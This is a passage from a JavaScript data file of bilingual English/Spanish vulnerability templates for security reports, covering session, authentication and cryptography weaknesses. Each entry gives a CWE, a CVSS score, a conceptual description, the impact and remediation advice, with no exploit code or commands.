      technicalDescription_es: "### Descripción Técnica\nEsto se puede lograr robando cookies de sesión (p. ej., a través de XSS o análisis de paquetes) o prediciendo los ID de sesión si no se generan aleatoriamente. El atacante luego usa el ID de sesión robado para suplantar al usuario.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the session management mechanism of the application.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el mecanismo de gestión de sesiones de la aplicación.]",
      impact_en: "### Impact\nThe attacker gains all the privileges of the hijacked user, potentially leading to data theft, fraud, or further system compromise.",
      impact_es: "### Impacto\nEl atacante obtiene todos los privilegios del usuario secuestrado, lo que puede conducir al robo de datos, fraude o un mayor compromiso del sistema.",
      recommendations_en: "### Recommendations\nUse secure, HttpOnly, and SameSite cookies. Regenerate session IDs upon login. Bind session IDs to other user-specific data like IP address or user agent.",
      recommendations_es: "### Recomendaciones\nUsar cookies seguras, HttpOnly y SameSite. Regenerar los ID de sesión al iniciar sesión. Vincular los ID de sesión a otros datos específicos del usuario como la dirección IP o el agente de usuario.",
      references: ["https://owasp.org/www-community/attacks/Session_hijacking_attack"],
      tags: ["Authentication", "Session"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-052",
      title_en: "Session Fixation",
      title_es: "Fijación de Sesión",
      cwe: "CWE-384",
      severity: "Medium",
      cvss: { score: 6.8, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "H", integrity: "H", availability: "N" },
      overview_en: "### Overview\nSession fixation is an attack that permits an attacker to hijack a valid user session. The attack explores a limitation in the way the web application manages the session ID, more specifically the session ID after the authentication process.",
      overview_es: "### Resumen\nLa fijación de sesión es un ataque que permite a un atacante secuestrar una sesión de usuario válida. El ataque explora una limitación en la forma en que la aplicación web gestiona el ID de sesión, más específicamente el ID de sesión después del proceso de autenticación.",
      technicalDescription_en: "### Technical Description\nAn attacker provides a legitimate user with a session ID they know. Once the user logs in using this session ID, the attacker can then use the same session ID to access the user's authenticated session.",
      technicalDescription_es: "### Descripción Técnica\nUn atacante proporciona a un usuario legítimo un ID de sesión que conoce. Una vez que el usuario inicia sesión con este ID de sesión, el atacante puede usar el mismo ID de sesión para acceder a la sesión autenticada del usuario.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the application's login and session management functionality.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad de inicio de sesión y gestión de sesiones de la aplicación.]",
      impact_en: "### Impact\nThis allows an attacker to impersonate a user and gain unauthorized access to their account.",
      impact_es: "### Impacto\nEsto permite a un atacante suplantar a un usuario y obtener acceso no autorizado a su cuenta.",
      recommendations_en: "### Recommendations\nGenerate a new session ID upon successful authentication. Do not accept session identifiers from URL parameters.",
      recommendations_es: "### Recomendaciones\nGenerar un nuevo ID de sesión tras una autenticación exitosa. No aceptar identificadores de sesión de los parámetros de la URL.",
      references: ["https://owasp.org/www-community/attacks/Session_fixation"],
      tags: ["Authentication", "Session"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-053",
      title_en: "Credential Stuffing",
      title_es: "Relleno de Credenciales",
      cwe: "CWE-1212",
      severity: "High",
      cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
      overview_en: "### Overview\nCredential stuffing is a type of cyberattack in which attackers use lists of compromised user credentials from data breaches to gain unauthorized access to user accounts on other websites.",
      overview_es: "### Resumen\nEl relleno de credenciales es un tipo de ciberataque en el que los atacantes usan listas de credenciales de usuario comprometidas de violaciones de datos para obtener acceso no autorizado a las cuentas de los usuarios en otros sitios web.",
      technicalDescription_en: "### Technical Description\nAttackers use automated bots to try large numbers of stolen username/password combinations against the application's login page. Due to password reuse, this can lead to a high rate of successful logins.",
      technicalDescription_es: "### Descripción Técnica\nLos atacantes usan bots automatizados para probar un gran número de combinaciones de nombre de usuario/contraseña robadas contra la página de inicio de sesión de la aplicación. Debido a la reutilización de contraseñas, esto puede llevar a una alta tasa de inicios de sesión exitosos.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the application's login functionality.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad de inicio de sesión de la aplicación.]",
      impact_en: "### Impact\nThis can result in widespread account takeovers, leading to data breaches and fraud.",
      impact_es: "### Impacto\nEsto puede resultar en la toma de control de cuentas a gran escala, lo que conduce a violaciones de datos y fraude.",
      recommendations_en: "### Recommendations\nImplement Multi-Factor Authentication (MFA). Use bot detection and account lockout mechanisms. Monitor for a high rate of failed login attempts.",
      recommendations_es: "### Recomendaciones\nImplementar la autenticación multifactor (MFA). Usar detección de bots y mecanismos de bloqueo de cuentas. Monitorear una alta tasa de intentos de inicio de sesión fallidos.",
      references: ["https://owasp.org/www-community/attacks/Credential_stuffing"],
      tags: ["Authentication", "Brute Force"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-054",
      title_en: "Insecure Password Recovery",
      title_es: "Recuperación Insegura de Contraseñas",
      cwe: "CWE-640",
      severity: "Medium",
      cvss: { score: 6.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "R", scope: "U", confidentiality: "L", integrity: "L", availability: "L" },
      overview_en: "### Overview\nThe password recovery mechanism is insecure, allowing an attacker to gain unauthorized access to a user's account.",
      overview_es: "### Resumen\nEl mecanismo de recuperación de contraseñas es inseguro, lo que permite a un atacante obtener acceso no autorizado a la cuenta de un usuario.",
      technicalDescription_en: "### Technical Description\nThis can be due to several factors, such as predictable password reset tokens, leaking tokens in URLs, or using weak security questions. An attacker can exploit these weaknesses to reset a victim's password and take over their account.",
      technicalDescription_es: "### Descripción Técnica\nEsto puede deberse a varios factores, como tokens de restablecimiento de contraseña predecibles, filtrado de tokens en URL o uso de preguntas de seguridad débiles. Un atacante puede explotar estas debilidades para restablecer la contraseña de una víctima y tomar el control de su cuenta.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the password recovery functionality.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad de recuperación de contraseñas.]",
      impact_en: "### Impact\nAn attacker can gain full control of a user's account.",
      impact_es: "### Impacto\nUn atacante puede obtener el control total de la cuenta de un usuario.",
      recommendations_en: "### Recommendations\nUse strong, unpredictable, and single-use password reset tokens. Send tokens via a secure channel (e.g., email). Expire tokens after a short period. Do not leak tokens in logs or URLs.",
      recommendations_es: "### Recomendaciones\nUsar tokens de restablecimiento de contraseña fuertes, impredecibles y de un solo uso. Enviar tokens a través de un canal seguro (p. ej., correo electrónico). Hacer que los tokens caduquen después de un corto período. No filtrar tokens en registros o URL.",
      references: ["https://owasp.org/www-project-cheat-sheets/cheatsheets/Forgot_Password_Cheat_Sheet.html"],
      tags: ["Authentication", "Password"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-055",
      title_en: "User Enumeration",
      title_es: "Enumeración de Usuarios",
      cwe: "CWE-203",
      severity: "Low",
      cvss: { score: 5.3, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "L", integrity: "N", availability: "N" },
      overview_en: "### Overview\nThe application provides different responses for valid and invalid usernames, allowing an attacker to determine which usernames are registered in the system.",
      overview_es: "### Resumen\nLa aplicación proporciona diferentes respuestas para nombres de usuario válidos e inválidos, lo que permite a un atacante determinar qué nombres de usuario están registrados en el sistema.",
      technicalDescription_en: "### Technical Description\nOn the login or password reset page, the application returns a message like 'User not found' for invalid usernames but 'Incorrect password' for valid usernames. An attacker can use this discrepancy to build a list of valid users.",
      technicalDescription_es: "### Descripción Técnica\nEn la página de inicio de sesión o de restablecimiento de contraseña, la aplicación devuelve un mensaje como 'Usuario no encontrado' para nombres de usuario no válidos, pero 'Contraseña incorrecta' para nombres de usuario válidos. Un atacante puede usar esta discrepancia para crear una lista de usuarios válidos.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the login or password reset page.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la página de inicio de sesión o de restablecimiento de contraseña.]",
      impact_en: "### Impact\nThis provides an attacker with a list of valid targets for other attacks, such as password spraying or phishing.",
      impact_es: "### Impacto\nEsto proporciona a un atacante una lista de objetivos válidos para otros ataques, como la pulverización de contraseñas o el phishing.",
      recommendations_en: "### Recommendations\nReturn a generic error message for all login failures, regardless of whether the username was valid or not (e.g., 'Invalid username or password').",
      recommendations_es: "### Recomendaciones\nDevolver un mensaje de error genérico para todos los fallos de inicio de sesión, independientemente de si el nombre de usuario era válido o no (p. ej., 'Nombre de usuario o contraseña no válidos').",
      references: ["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account"],
      tags: ["Authentication", "Enumeration"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-056",
      title_en: "Weak Session Management",
      title_es: "Gestión Débil de Sesiones",
      cwe: "CWE-613",
      severity: "High",
      cvss: { score: 8.1, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nThe application's session management is weak, leading to vulnerabilities like long session timeouts, insecure cookie attributes, or predictable session IDs.",
      overview_es: "### Resumen\nLa gestión de sesiones de la aplicación es débil, lo que conduce a vulnerabilidades como tiempos de espera de sesión largos, atributos de cookie inseguros o ID de sesión predecibles.",
      technicalDescription_en: "### Technical Description\nSession tokens do not expire or have very long expiration times. Cookies are not marked as Secure or HttpOnly. Session IDs are not regenerated after login. An attacker can exploit these weaknesses to hijack sessions.",
      technicalDescription_es: "### Descripción Técnica\nLos tokens de sesión no caducan o tienen tiempos de caducidad muy largos. Las cookies no están marcadas como Seguras o HttpOnly. Los ID de sesión no se regeneran después del inicio de sesión. Un atacante puede explotar estas debilidades para secuestrar sesiones.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the session management implementation.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la implementación de la gestión de sesiones.]",
      impact_en: "### Impact\nThis increases the risk of session hijacking, allowing an attacker to impersonate a user.",
      impact_es: "### Impacto\nEsto aumenta el riesgo de secuestro de sesión, lo que permite a un atacante suplantar a un usuario.",
      recommendations_en: "### Recommendations\nImplement short session timeouts. Use Secure, HttpOnly, and SameSite attributes for cookies. Regenerate session IDs upon any change in privilege level, including login.",
      recommendations_es: "### Recomendaciones\nImplementar tiempos de espera de sesión cortos. Usar los atributos Secure, HttpOnly y SameSite para las cookies. Regenerar los ID de sesión ante cualquier cambio en el nivel de privilegio, incluido el inicio de sesión.",
      references: ["https://owasp.org/www-project-cheat-sheets/cheatsheets/Session_Management_Cheat_Sheet.html"],
      tags: ["Authentication", "Session"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-057",
      title_en: "Brute Force Attacks",
      title_es: "Ataques de Fuerza Bruta",
      cwe: "CWE-307",
      severity: "High",
      cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
      overview_en: "### Overview\nThe application does not protect against brute force attacks, allowing an attacker to make an unlimited number of attempts to guess a user's password.",
      overview_es: "### Resumen\nLa aplicación no protege contra ataques de fuerza bruta, lo que permite a un atacante realizar un número ilimitado de intentos para adivinar la contraseña de un usuario.",
      technicalDescription_en: "### Technical Description\nThe login functionality does not implement account lockout or CAPTCHA mechanisms after a certain number of failed attempts. An attacker can use an automated tool to try millions of passwords against a single user account.",
      technicalDescription_es: "### Descripción Técnica\nLa funcionalidad de inicio de sesión no implementa mecanismos de bloqueo de cuenta o CAPTCHA después de un cierto número de intentos fallidos. Un atacante puede usar una herramienta automatizada para probar millones de contraseñas contra una única cuenta de usuario.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the login functionality.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad de inicio de sesión.]",
      impact_en: "### Impact\nA successful brute force attack leads to account compromise.",
      impact_es: "### Impacto\nUn ataque de fuerza bruta exitoso conduce al compromiso de la cuenta.",
      recommendations_en: "### Recommendations\nImplement account lockout policies (e.g., lock account for 15 minutes after 5 failed attempts). Use CAPTCHA to prevent automated attacks. Implement Multi-Factor Authentication (MFA).",
      recommendations_es: "### Recomendaciones\nImplementar políticas de bloqueo de cuentas (p. ej., bloquear la cuenta durante 15 minutos después de 5 intentos fallidos). Usar CAPTCHA para prevenir ataques automatizados. Implementar Autenticación Multifactor (MFA).",
      references: ["https://owasp.org/www-community/attacks/Brute_force_attack"],
      tags: ["Authentication", "Brute Force"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-058",
      title_en: "Weak <APPLICATION> Admin Credentials",
      title_es: "Credenciales Débiles de Administrador en <APPLICATION>",
      cwe: "CWE-521",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nThe administrative interface of <APPLICATION> is protected by weak or default credentials, providing an easy path for an attacker to gain administrative access.",
      overview_es: "### Resumen\nLa interfaz administrativa de <APPLICATION> está protegida por credenciales débiles o predeterminadas, lo que proporciona un camino fácil para que un atacante obtenga acceso administrativo.",
      technicalDescription_en: "### Technical Description\nAn attacker identified the administrative panel for <APPLICATION> and was able to log in using common or default credentials like 'admin/admin', 'root/password', etc.",
      technicalDescription_es: "### Descripción Técnica\nUn atacante identificó el panel administrativo de <APPLICATION> y pudo iniciar sesión usando credenciales comunes o predeterminadas como 'admin/admin', 'root/password', etc.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the URL of the <APPLICATION> admin panel.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la URL del panel de administración de <APPLICATION>.]",
      impact_en: "### Impact\nFull administrative control over the <APPLICATION> instance, which can lead to further system compromise, data exfiltration, or denial of service.",
      impact_es: "### Impacto\nControl administrativo total sobre la instancia de <APPLICATION>, lo que puede conducir a un mayor compromiso del sistema, exfiltración de datos o denegación de servicio.",
      recommendations_en: "### Recommendations\nChange default credentials immediately. Enforce a strong password policy for all administrative accounts. Implement MFA for administrative access.",
      recommendations_es: "### Recomendaciones\nCambiar las credenciales predeterminadas inmediatamente. Imponer una política de contraseñas segura para todas las cuentas administrativas. Implementar MFA para el acceso administrativo.",
      references: ["https://cwe.mitre.org/data/definitions/521.html"],
      tags: ["Authentication", "Credentials"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-059",
      title_en: "Passwords in AD User Description Field",
      title_es: "Contraseñas en Campo de Descripción de Usuario de AD",
      cwe: "CWE-312",
      severity: "High",
      cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
      overview_en: "### Overview\nUser account passwords or password hints are stored in cleartext in the description field of user objects in Active Directory.",
      overview_es: "### Resumen\nLas contraseñas de las cuentas de usuario o pistas de contraseñas se almacenan en texto plano en el campo de descripción de los objetos de usuario en Active Directory.",
      technicalDescription_en: "### Technical Description\nAny authenticated user can query Active Directory and read the description field for all users. This field was found to contain passwords, which can be used to escalate privileges or move laterally.",
      technicalDescription_es: "### Descripción Técnica\nCualquier usuario autenticado puede consultar Active Directory y leer el campo de descripción de todos los usuarios. Se encontró que este campo contenía contraseñas, que pueden usarse para escalar privilegios o moverse lateralmente.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the user accounts with passwords in their description field.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar las cuentas de usuario con contraseñas en su campo de descripción.]",
      impact_en: "### Impact\nThis leads to the direct compromise of user accounts and can facilitate widespread lateral movement and privilege escalation within the domain.",
      impact_es: "### Impacto\nEsto conduce al compromiso directo de las cuentas de usuario y puede facilitar un amplio movimiento lateral y escalada de privilegios dentro del dominio.",
      recommendations_en: "### Recommendations\nImmediately remove all passwords from user description fields. Implement a policy and training to forbid this practice. Regularly audit AD user objects for sensitive information.",
      recommendations_es: "### Recomendaciones\nEliminar inmediatamente todas las contraseñas de los campos de descripción de los usuarios. Implementar una política y capacitación para prohibir esta práctica. Auditar regularmente los objetos de usuario de AD en busca de información sensible.",
      references: ["https://adsecurity.org/?p=2535"],
      tags: ["Authentication", "Active Directory"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-060",
      title_en: "Weak Encryption Algorithms",
      title_es: "Algoritmos de Cifrado Débiles",
      cwe: "CWE-327",
      severity: "High",
      cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
      overview_en: "### Overview\nThe application uses weak or outdated cryptographic algorithms that are known to be vulnerable.",
      overview_es: "### Resumen\nLa aplicación utiliza algoritmos criptográficos débiles u obsoletos que se sabe que son vulnerables.",
      technicalDescription_en: "### Technical Description\nUse of cryptographic algorithms such as DES, RC4, or hashing algorithms like MD5 or SHA-1 for sensitive operations. These algorithms can be broken with modern computing power, allowing an attacker to decrypt data or forge signatures.",
      technicalDescription_es: "### Descripción Técnica\nUso de algoritmos criptográficos como DES, RC4, o algoritmos de hash como MD5 o SHA-1 para operaciones sensibles. Estos algoritmos pueden romperse con la potencia informática moderna, lo que permite a un atacante descifrar datos o falsificar firmas.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the functionality that uses weak cryptography, e.g., data encryption, password hashing, TLS configuration.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad que utiliza criptografía débil, p. ej., cifrado de datos, hash de contraseñas, configuración de TLS.]",
      impact_en: "### Impact\nAn attacker can decrypt sensitive information, leading to data breaches and account compromise.",
      impact_es: "### Impacto\nUn atacante puede descifrar información sensible, lo que conduce a violaciones de datos y compromiso de cuentas.",
      recommendations_en: "### Recommendations\nUse strong, industry-standard cryptographic algorithms (e.g., AES-256-GCM, SHA-256). Migrate away from all legacy and weak algorithms.",
      recommendations_es: "### Recomendaciones\nUtilizar algoritmos criptográficos sólidos y estándar de la industria (p. ej., AES-256-GCM, SHA-256). Migrar y dejar de usar todos los algoritmos heredados y débiles.",
      references: ["https://cwe.mitre.org/data/definitions/327.html"],
      tags: ["Cryptography", "Weak Algorithm"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-061",
      title_en: "Insecure Key Management",
      title_es: "Gestión Insegura de Claves",
      cwe: "CWE-320",
      severity: "High",
      cvss: { score: 8.8, vectorString: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "L", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
      overview_en: "### Overview\nCryptographic keys are not managed securely throughout their lifecycle, leading to potential compromise.",
      overview_es: "### Resumen\nLas claves criptográficas no se gestionan de forma segura a lo largo de su ciclo de vida, lo que lleva a un posible compromiso.",
      technicalDescription_en: "### Technical Description\nThis includes issues like hardcoding keys in source code, storing keys in insecure locations, using weak keys, or not rotating keys regularly. An attacker who finds a key can decrypt all data protected by it.",
      technicalDescription_es: "### Descripción Técnica\nEsto incluye problemas como claves incrustadas en el código fuente, almacenamiento de claves en ubicaciones inseguras, uso de claves débiles o no rotar las claves regularmente. Un atacante que encuentra una clave puede descifrar todos los datos protegidos por ella.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the insecure key management practice and location of the key.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la práctica de gestión de claves insegura y la ubicación de la clave.]",
      impact_en: "### Impact\nCompromise of a cryptographic key can lead to the decryption of all sensitive data, past and future, that is protected by that key.",
      impact_es: "### Impacto\nEl compromiso de una clave criptográfica puede llevar al descifrado de todos los datos sensibles, pasados y futuros, que están protegidos por esa clave.",
      recommendations_en: "### Recommendations\nUse a dedicated key management solution (e.g., HSM, KMS). Do not hardcode keys. Generate strong, random keys. Implement a key rotation policy.",
      recommendations_es: "### Recomendaciones\nUtilizar una solución de gestión de claves dedicada (p. ej., HSM, KMS). No incrustar claves en el código. Generar claves fuertes y aleatorias. Implementar una política de rotación de claves.",
      references: ["https://cwe.mitre.org/data/definitions/320.html"],
      tags: ["Cryptography", "Key Management"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-062",
      title_en: "Use of Hardcoded Secrets",
      title_es: "Uso de Secretos Embebidos",
      cwe: "CWE-798",
      severity: "High",
      cvss: { score: 7.5, vectorString: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "L", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
      overview_en: "### Overview\nSensitive information such as passwords, API keys, or encryption keys are hardcoded directly into the application's source code or configuration files.",
      overview_es: "### Resumen\nInformación sensible como contraseñas, claves de API o claves de cifrado están incrustadas directamente en el código fuente o en los archivos de configuración de la aplicación.",
      technicalDescription_en: "### Technical Description\nAn attacker with access to the source code or application binary can easily extract these hardcoded secrets. This is a common issue in mobile applications and client-side code.",
      technicalDescription_es: "### Descripción Técnica\nUn atacante con acceso al código fuente o al binario de la aplicación puede extraer fácilmente estos secretos incrustados. Este es un problema común en aplicaciones móviles y código del lado del cliente.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the file and line number where the secret is hardcoded.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar el archivo y el número de línea donde el secreto está incrustado.]",
      impact_en: "### Impact\nThis can lead to the compromise of backend services, databases, or third-party APIs.",
      impact_es: "### Impacto\nEsto puede llevar al compromiso de servicios backend, bases de datos o API de terceros.",
      recommendations_en: "### Recommendations\nStore secrets in a secure vault or key management system. Use environment variables or a secure configuration service to provide secrets to the application at runtime.",
      recommendations_es: "### Recomendaciones\nAlmacenar secretos en una bóveda segura o sistema de gestión de claves. Usar variables de entorno o un servicio de configuración seguro para proporcionar secretos a la aplicación en tiempo de ejecución.",
      references: ["https://cwe.mitre.org/data/definitions/798.html"],
      tags: ["Cryptography", "Hardcoded Secret"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-063",
      title_en: "Insufficient Entropy",
      title_es: "Entropía Insuficiente",
      cwe: "CWE-331",
      severity: "Medium",
      cvss: { score: 5.9, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
      overview_en: "### Overview\nThe application uses a source of randomness that does not have sufficient entropy, leading to predictable values.",
      overview_es: "### Resumen\nLa aplicación utiliza una fuente de aleatoriedad que no tiene suficiente entropía, lo que lleva a valores predecibles.",
      technicalDescription_en: "### Technical Description\nCryptographic values that should be random, such as session IDs or password reset tokens, are generated using a predictable algorithm or a weak source of randomness (e.g., `Math.random()` in some languages). An attacker can predict these values.",
      technicalDescription_es: "### Descripción Técnica\nLos valores criptográficos que deberían ser aleatorios, como los ID de sesión o los tokens de restablecimiento de contraseña, se generan utilizando un algoritmo predecible o una fuente débil de aleatoriedad (p. ej., `Math.random()` en algunos idiomas). Un atacante puede predecir estos valores.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the functionality that uses a weak random number generator.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad que utiliza un generador de números aleatorios débil.]",
      impact_en: "### Impact\nThis can lead to session hijacking, account takeover, or other attacks that rely on predicting a 'random' value.",
      impact_es: "### Impacto\nEsto puede llevar al secuestro de sesión, la toma de control de cuentas u otros ataques que dependen de la predicción de un valor 'aleatorio'.",
      recommendations_en: "### Recommendations\nUse a cryptographically secure pseudo-random number generator (CSPRNG) for all security-sensitive operations.",
      recommendations_es: "### Recomendaciones\nUtilizar un generador de números pseudoaleatorios criptográficamente seguro (CSPRNG) para todas las operaciones sensibles a la seguridad.",
      references: ["https://cwe.mitre.org/data/definitions/331.html"],
      tags: ["Cryptography", "Randomness"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-064",
      title_en: "Padding Oracle Attacks",
      title_es: "Ataques de Oráculo de Relleno",
      cwe: "CWE-209",
      severity: "Medium",
      cvss: { score: 6.8, vectorString: "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "L", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "L", availability: "N" },
      overview_en: "### Overview\nA padding oracle attack is a type of attack which uses the padding validation of a cryptographic message to decrypt the ciphertext.",
      overview_es: "### Resumen\nUn ataque de oráculo de relleno es un tipo de ataque que utiliza la validación del relleno de un mensaje criptográfico para descifrar el texto cifrado.",
      technicalDescription_en: "### Technical Description\nWhen decrypting data, the application returns different error messages depending on whether the padding is valid or not. An attacker can use this difference as an oracle to decrypt encrypted data, byte by byte, without knowing the encryption key.",
      technicalDescription_es: "### Descripción Técnica\nAl descifrar datos, la aplicación devuelve diferentes mensajes de error dependiendo de si el relleno es válido o no. Un atacante puede usar esta diferencia como un oráculo para descifrar datos cifrados, byte por byte, sin conocer la clave de cifrado.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the functionality that decrypts data and returns distinguishable padding errors.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad que descifra datos y devuelve errores de relleno distinguibles.]",
      impact_en: "### Impact\nAn attacker can decrypt sensitive information, such as session cookies or encrypted data in a database.",
      impact_es: "### Impacto\nUn atacante puede descifrar información sensible, como cookies de sesión o datos cifrados en una base de datos.",
      recommendations_en: "### Recommendations\nUse authenticated encryption (e.g., AES-GCM) which provides integrity checks. Ensure that padding errors are handled generically and do not provide different responses.",
      recommendations_es: "### Recomendaciones\nUtilizar cifrado autenticado (p. ej., AES-GCM) que proporciona comprobaciones de integridad. Asegurarse de que los errores de relleno se manejen de forma genérica y no proporcionen respuestas diferentes.",
      references: ["https://portswigger.net/web-security/attacks/padding-oracle"],
      tags: ["Cryptography", "Oracle Attack"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-065",
      title_en: "Weak Random Number Generation",
      title_es: "Generación Débil de Números Aleatorios",
      cwe: "CWE-338",
      severity: "Medium",
      cvss: { score: 5.9, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "N", availability: "N" },
      overview_en: "### Overview\nThe application uses a weak or predictable random number generator for security-sensitive contexts.",
      overview_es: "### Resumen\nLa aplicación utiliza un generador de números aleatorios débil o predecible para contextos sensibles a la seguridad.",
      technicalDescription_en: "### Technical Description\nThe use of non-cryptographically secure pseudo-random number generators (PRNGs), such as `java.util.Random` or Python's `random` module, for generating values like session tokens, CSRF tokens, or password reset tokens. These can be predicted by an attacker under certain conditions.",
      technicalDescription_es: "### Descripción Técnica\nEl uso de generadores de números pseudoaleatorios no criptográficamente seguros (PRNG), como `java.util.Random` o el módulo `random` de Python, para generar valores como tokens de sesión, tokens CSRF o tokens de restablecimiento de contraseña. Estos pueden ser predichos por un atacante bajo ciertas condiciones.",
      affectedComponents_en: "### Affected Components\n[TODO: Specify the functionality relying on weak randomness.]",
      affectedComponents_es: "### Componentes Afectados\n[TODO: Especificar la funcionalidad que depende de una aleatoriedad débil.]",
      impact_en: "### Impact\nThis can lead to the compromise of security mechanisms that rely on unpredictability, such as session hijacking or account takeover.",
      impact_es: "### Impacto\nEsto puede llevar al compromiso de los mecanismos de seguridad que dependen de la imprevisibilidad, como el secuestro de sesiones o la toma de control de cuentas.",
      recommendations_en: "### Recommendations\nAlways use a Cryptographically Secure Pseudo-Random Number Generator (CSPRNG) for generating any security-sensitive values. Examples include `/dev/urandom` on Linux, `java.security.SecureRandom` in Java, and Python's `secrets` module.",
      recommendations_es: "### Recomendaciones\nUtilizar siempre un Generador de Números Pseudoaleatorios Criptográficamente Seguro (CSPRNG) para generar cualquier valor sensible a la seguridad. Ejemplos incluyen `/dev/urandom` en Linux, `java.security.SecureRandom` en Java y el módulo `secrets` de Python.",
      references: ["https://cwe.mitre.org/data/definitions/338.html"],
      tags: ["Cryptography", "Randomness"],
      ...emptyVulnBoilerplate
    },
    {
      id: "vuln-066",
      title_en: "Cryptographic Flaws in Design",
      title_es: "Defectos Criptográficos en el Diseño",
      cwe: "CWE-310",
      severity: "High",
      cvss: { score: 8.1, vectorString: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H", attackVector: "N", attackComplexity: "H", privilegesRequired: "N", userInteraction: "N", scope: "U", confidentiality: "H", integrity: "H", availability: "H" },
